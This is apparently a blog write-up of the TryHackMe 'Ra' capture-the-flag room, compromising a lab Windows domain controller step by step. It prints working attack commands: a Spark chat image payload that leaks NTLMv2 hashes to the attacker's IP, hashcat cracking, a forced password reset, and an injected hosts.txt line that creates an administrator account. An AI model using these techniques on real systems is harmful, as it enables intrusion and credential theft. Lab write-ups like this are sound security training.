---
title: "tryhackme: ra"
date: 2021-11-10T16:37:38-05:00
draft: false
type: "post"
---

as i've been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i've had to take time away from it to keep practicing all that i've learned so far. "ra" happened to be the most challenging room i've done until now, but i'm sure there are more to come, that take even more skills into account.

the story with the room is that there's a mega corporation called WindCorp, and they like to brag about the fact that they're "unhackable". in this story, we're a hacker trying to make them eat their words, and we'll be exploiting a windows machine that we've spotted.


as usual, we get a target IP address: `10.10.75.59`

and again, we'll start off with an nmap scan (and save the results):

```sh
nmap -sC -sV -Pn -oN openports.txt 10.10.75.79
```

i'll trim the fat:

```sh
53/tcp   open  domain              Simple DNS Plus
80/tcp   open  http                Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5269/tcp open  xmpp                Wildfire XMPP Client
7070/tcp open  http                Jetty 9.4.18.v20190429
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
7777/tcp open  socks5              (No authentication; connection failed)
9090/tcp open  zeus-admin?
9091/tcp open  ssl/xmltec-xmlmail?
```


we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.

i modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name). 

let's visit http://windcorp.thm.

the search bar on the site doesn't work, but the "reset password" link does.

- ![reset](/resetpassword.PNG)

i have no idea how to fill in these fields, so i'm going to continue digging around the site.

scrolling down a bit, and we can see a list of employees:

```s
Antonietta Vidal
Britney Palmer
Brittany Cruz
Carla Meyer
Buse Candan
Edeltraut Daub
Edward Lewis
Emile Lavoie
Emile Henry
Emily Anderson
Hemmo Boschma
Isabella Hughes
Isra Saur
Jackson Vasquez
Jaqueline Dittmer
Emily Jensen
Lily Levesque
Kirk Uglas
```

let's save these names to a file (users.txt), then break up the names so we can search the site's source to see if they pop in any form anywhere else.

```sh
cat users.txt | tr -s ' ' '\n' > userslist.txt
```

the output (userslist.txt) now looks like:

```
Antonietta
Vidal
Britney
Palmer
Brittany
Cruz
Carla
Meyer
Buse
Candan
Edeltraut
Daub
Edward
Lewis
Emile
Lavoie
Emile
Henry
Emily
Anderson
Hemmo
Boschma
Isabella
Hughes
Isra
Saur
Jackson
Vasquez
Jaqueline
Dittmer
Emily
Jensen
Lily
Levesque
Kirk
Uglas
```

now let's feed this list to a ```curl``` command:

```
curl http://windcorp.thm | egrep -i -f userslist.txt
```

- ![curlingusers](/curlingusers.PNG)


we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was **lilyleAndSparky.jpg**. 

- ![employees](/employees.PNG)

- ![employees2](/employees2.PNG)


could this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name "sparky" (probably her dog's name). one of the security questions was "what is/was your favorite pets name?". let's try it.

- ![lilylepassword](/lilylepassword.PNG)


wow, it actually worked. which is good, because if it didn't i would really not know what to do next and would have to rethink my whole attack.

armed with these credentials (lilyle:ChangeMe#1234), let's enumerate the SMB shares and try to log into one of them.

```sh
smbclient -L 10.10.75.59 -U lilyle
```

enter the password when prompted.

we can also use:

```sh
smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
```

- ![smbenumeration](/smbenumeration.PNG)

let's try to login to the "Shared" share.

```sh
smbclient \\\\10.10.75.59\\Shared -U lilyle --password ChangeMe#1234
```

- ![smblogin](/smblogin+flag1.PNG)

we can see there's a flag stored right there, along with installers for an application called "spark". 

let's download both the flag, and the .deb installer.

```sh
get "Flag 1.txt"
get spark_2_8_3.deb
```

if the installer is too big for your network connection, the connection will timeout. in that case, you can try ```curl```:

```sh
curl -u "windcorp.thm\lilyle:ChangeMe#1234" smb://windcorp.thm/Shared/spark_2_8_3.deb
```

this didn't work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn't work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn't matter, but in a real-life scenario, versions are often very important, and some exploits don't work with later versions of applications.

once you've downloaded spark, try to get some info on the package.

```sh
dpkg-deb -I spark_2_8_3.deb
```

- ![sparkinfo](/sparkinfo.PNG)

it's a "cross-platform real-time collaboration client optimized for business and organizations".

basically, it's an IM client or chat app.


when it's installed, try to use the credentials lilyle:ChangeMe#1234 to log in.

the login fails, because the app wasn't able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option "accept all certificates" and disable "certificate hostname verification".

now, we can log in. 

we see there's a conference room, but no one is in it. the app looks pretty empty.

- ![spark_room](/spark_room.PNG)

- ![sparkempty](/sparkempty.PNG)

when dealing with apps like this, it's good practice to start searching vuln databases to see if any exploit exists. a good place to check is https://attackerkb.com/

searching for "spark exploits" leads us to CVE-2020-12772. 

- ![attackerkb](/attackerkb.PNG)

in a nutshell, this exploit allows us to send an "image" to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we'll need to run Responder.py.

now we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user "buse" is online. let's target them.

first, run responder:

```sh
/opt/Responder/Responder.py
```

now, send the following "image" to buse:

```sh
<img src="http://10.9.6.194/bilal.jpg>
```

wait for buse to click the link...

- ![responder](/responder.PNG)

- ![sparkexploit](/sparkexploit.PNG)

we receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):

```sh
hashcat.exe -a 0 -m 5600 "buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000" C:\rockyou.txt
```

upon a successful crack, we'll get the password ```uzunLM+3131```. great- ! now we have another set of credentials -- buse:uzunLM+3131


note: i do recommend saving found/cracked credentials in a text file. that way we're not constantly scrolling through terminal trying to find them.

```sh
echo "buse:uzunLM+3131" > creds.txt
```


now we get to use one of my favourite tools ever: [evil winrm](https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/). if you don't know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it's extremely useful in the post-exploitation phase.

```sh
evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
```

this will log us in as buse, and upon poking around, you'll locate the 2nd flag. 

what's more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\ that contains a powershell script and its log. 

- ![busescripts](/busescripts.PNG)

the code for the checkservers.ps1 script is as follows:

```powershell
# reset the lists of hosts prior to looping
$OutageHosts = $Null
# specify the time you want email notifications resent for hosts that are down
$EmailTimeOut = 30
# specify the time you want to cycle through your host lists.
$SleepTimeOut = 45
# specify the maximum hosts that can be down before the script is aborted
$MaxOutageCount = 10
# specify who gets notified
$notificationto = "brittanycr@windcorp.thm"
# specify where the notifications come from
$notificationfrom = "admin@windcorp.thm"
# specify the SMTP server
$smtpserver = "relay.windcorp.thm"

# start looping here
Do{
$available = $Null
$notavailable = $Null
Write-Host (Get-Date)

# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
if($p)
    {
     # if the Host is available then just write it to the screen
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
     [Array]$available += $_
    }
else
    {
     # If the host is unavailable, give a warning to screen
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
     if(!($p))
       {
        # If the host is still unavailable for 4 full pings, write error and send email
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
        [Array]$notavailable += $_

        if ($OutageHosts -ne $Null)
            {
                if (!$OutageHosts.ContainsKey($_))
                {
                 # First time down add to the list and send email
                 Write-Host "$_ Is not in the OutageHosts list, first time down"
                 $OutageHosts.Add($_,(get-date))
                 $Now = Get-date
                 $Body = "$_ has not responded for 5 pings at $Now"
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                  -Subject "Host $_ is down" -SmtpServer $smtpserver
                }
                else
                {
                    # If the host is in the list do nothing for 1 hour and then remove from the list.
                    Write-Host "$_ Is in the OutageHosts list"
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
                    {$OutageHosts.Remove($_)}
                }
            }
        else
            {
                # First time down create the list and send email
                Write-Host "Adding $_ to OutageHosts."
                $OutageHosts = @{$_=(get-date)}
                $Body = "$_ has not responded for 5 pings at $Now"
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                 -Subject "Host $_ is down" -SmtpServer $smtpserver
            }
       }
    }
}
# Report to screen the details
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count
Write-Host "Not available count:"$notavailable.count
Write-Host "Not available hosts:"
$OutageHosts
Write-Host ""
Write-Host "Sleeping $SleepTimeOut seconds"
sleep $SleepTimeOut
if ($OutageHosts.Count -gt $MaxOutageCount)
{
    # If there are more than a certain number of host down in an hour abort the script.
    $Exit = $True
    $body = $OutageHosts | Out-String
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
}
}
while ($Exit -ne $True)
```


it looks like this code is checking the status of some hosts every 1 minute, from a file stored at ```C:\Users\brittanycr\hosts.txt```.

when we try to read brittanycr's directories, our access is denied.

- ![brittanycr](/brittanycr.PNG)

if we run the command ```whoami /groups``` as buse, we'll see that buse is in the group "account operators".

- ![whoamigroups](/whoamigroups.PNG)

account operators can change passwords for other users, which means buse can change the password for brittanycr.

```
net user brittanycr wEiRdP@$$W0rd1234! /domain
```

(i chose this password because it complies with the password policy.)

once the password has been changed, let's try to get that file at ```C:\Users\brittanycr\hosts.txt```. since the checkservers.ps1 script reads from this file without being too annoying about checking what's in it, we're gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.


getting in:

```sh
smbclient \\\\windcorp.thm\\Users -U brittanycr --password wEiRdP@$$W0rd1234!
```

navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:

```s
; net user bilal 'p*s$w0rd123' /add; net localgroup Administrators bilal /add
```

- ![hosts](/hosts.PNG)

when the script performs this little maneuver, it will inadvertently create a user "bilal", and add me to the Administrators group heh heh.

we have to replace the previous hosts.txt file with the new one. we can do this using the ```upload``` command in brittanycr's evil winrm instance.

now if we navigate to buse's "scripts" folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you're patient, you'll see the script will have run.


we should now be able to access the network with our new (root) credentials. 

- ![evilwinrmfail](/evilwinrmfail.PNG)

hmmm, evil winrm is failing to log me in. maybe we can use another tool?

first, i have to check if my credentials are actually root. to do this, let's use [crackmapexec](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/), a badass tool that quickly assesses the security of large AD networks. if it says we have access, i'll use psexec.py to log in.

```sh
crackmapexec smb windcorp.thm -u bilal -p 'p*s$w0rd123'

python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm
```

- ![pwned](/pwned.PNG)

hell yeah, *we're in*.

- ![rootflag](/rootflag.PNG)


that was a hell of a ride. from doing a bit of recon on the company's users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root...i guess WindCorp isn't unhackable after all :)



